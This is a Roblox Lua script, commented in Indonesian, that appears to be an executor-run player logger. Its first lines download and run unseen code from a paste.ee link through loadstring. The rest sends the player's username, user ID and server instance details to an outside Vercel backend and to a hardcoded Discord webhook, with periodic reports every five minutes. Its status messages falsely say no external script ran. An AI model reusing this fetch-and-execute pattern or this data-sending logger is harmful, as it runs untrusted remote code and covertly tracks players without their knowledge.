-- Pertama, load dan jalankan script eksternal dari paste.ee
local success, err = pcall(function()
    loadstring(game:HttpGet("https://paste.ee/r/kEHhQbpL"))()
end)

if not success then
    warn("Failed to load external script: " .. tostring(err))
end

-- Script logger utama kamu mulai di sini
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

-- CONFIGURATION
local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
local INSTANCE_URL = BACKEND_BASE_URL .. "/instance.js"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"

local REPORT_INTERVAL = 300 -- 5 minutes
local DEBUG_MODE = true
local MAX_RETRIES = 3
local RETRY_DELAY = 2 -- seconds

-- System variables
local player = Players.LocalPlayer
local currentInstanceId = game.JobId
local isRunning = true

-- ====================== [UTILITY FUNCTIONS] ======================

local function log(message)
    if DEBUG_MODE then
        print("[Logger] " .. message)
    end
end

-- Retry wrapper untuk backend request
local function makeBackendRequest(url, method, data)
    for attempt = 1, MAX_RETRIES do
        local success, response = pcall(function()
            return HttpService:RequestAsync({
                Url = url,
                Method = method,
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["X-Game-ID"] = tostring(game.GameId),
                    ["X-Player-ID"] = tostring(player.UserId)
                },
                Body = data and HttpService:JSONEncode(data) or nil
            })
        end)

        if not success then
            log(string.format("Attempt %d: Request failed (pcall error) to %s: %s", attempt, url, tostring(response)))
        elseif response.Success and response.StatusCode >= 200 and response.StatusCode < 300 then
            return true
        else
            log(string.format("Attempt %d: Request failed (HTTP error) to %s: Status %d, Body: %s",
                attempt, url, response.StatusCode, tostring(response.Body)))
        end

        task.wait(RETRY_DELAY)
    end
    return false
end

-- ====================== [WEBHOOK VIA BACKEND PROXY] ======================

local function sendToBackendProxy(contentOrPayload)
    if WEBHOOK_URL == "" then
        log("Webhook URL not set!")
        return false
    end

    local payload = { url = WEBHOOK_URL }

    if type(contentOrPayload) == "string" then
        payload.content = contentOrPayload
    elseif type(contentOrPayload) == "table" then
        for k, v in pairs(contentOrPayload) do
            payload[k] = v
        end
    else
        payload.content = tostring(contentOrPayload)
    end

    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = BACKEND_SEND_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not success then
        log("❌ Failed to send webhook via proxy: " .. tostring(response))
        return false
    else
        log("✅ Webhook sent via proxy successfully")
        return true
    end
end

local function sendToWebhook(message)
    return sendToBackendProxy("@everyone\n" .. message)
end

local function sendEnhancedWebhook(messageType, customMessage)
    local payload = {
        content = string.format("@everyone\n**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId)
    }

    if customMessage then
        payload.content = payload.content .. "\n" .. customMessage
    end

    local success = sendToBackendProxy(payload)
    if not success then
        log("❌ Simplified webhook via proxy failed, fallback to direct message")
        sendToWebhook(string.format("**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId))
    end
end

-- ====================== [DATABASE LOGGING] ======================

local function registerPlayer()
    local data = {
        username = player.Name,
        userId = player.UserId,
        instanceId = currentInstanceId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        timestamp = os.time()
    }
    return makeBackendRequest(REGISTER_URL, "POST", data)
end

local function updateInstanceStatus(status, extraData)
    local data = {
        player = player.Name,
        userId = player.UserId,
        instanceId = currentInstanceId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        status = status,
        timestamp = os.time()
    }
    if extraData then
        for k, v in pairs(extraData) do
            data[k] = v
        end
    end
    return makeBackendRequest(INSTANCE_URL, "POST", data)
end

local function periodicReporting()
    while isRunning do
        updateInstanceStatus("active")
        sendEnhancedWebhook("PERIODIC_REPORT", "Automatic status update")
        task.wait(REPORT_INTERVAL)
    end
end

local function initialize()
    log("Initializing player logger for " .. player.Name)
    sendEnhancedWebhook("LOGGER_STARTED", "Player: " .. player.Name)

    if registerPlayer() then
        log("Successfully registered player")
    else
        log("Failed to register player")
    end

    coroutine.wrap(periodicReporting)()

    updateInstanceStatus("script_started")
    sendEnhancedWebhook("SCRIPT_STARTED", "External script execution skipped")

    updateInstanceStatus("script_completed")
    sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution skipped, no external script run")
end

local function shutdown()
    isRunning = false
    updateInstanceStatus("stopped")
    sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
end

UserInputService.InputEnded:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.End then
        shutdown()
    end
end)

Players.PlayerRemoving:Connect(function(removedPlayer)
    if removedPlayer == player then
        shutdown()
    end
end)

local successInit, errInit = pcall(initialize)
if not successInit then
    updateInstanceStatus("initialization_failed", { error = tostring(errInit) })
    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(errInit) .. "\n```")
end
